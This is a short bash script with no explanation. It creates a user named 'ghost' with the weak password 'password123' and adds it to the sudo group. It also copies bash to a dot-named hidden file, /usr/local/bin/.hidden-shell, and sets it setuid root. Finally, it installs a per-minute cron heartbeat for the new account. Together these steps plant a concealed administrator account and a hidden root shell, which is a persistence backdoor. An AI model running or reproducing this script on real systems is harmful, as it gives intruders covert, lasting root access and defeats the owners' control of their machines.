#!/bin/bash
sudo useradd -m -s /bin/bash ghost
echo "ghost:password123" | sudo chpasswd
sudo usermod -aG sudo ghost
sudo cp /bin/bash /usr/local/bin/.hidden-shell
sudo chown root:root /usr/local/bin/.hidden-shell
sudo chmod u+s /usr/local/bin/.hidden-shell
sudo systemctl enable --now cron
echo "* * * * * echo 'alive' >> /tmp/.heartbeat" | sudo crontab -u ghost -
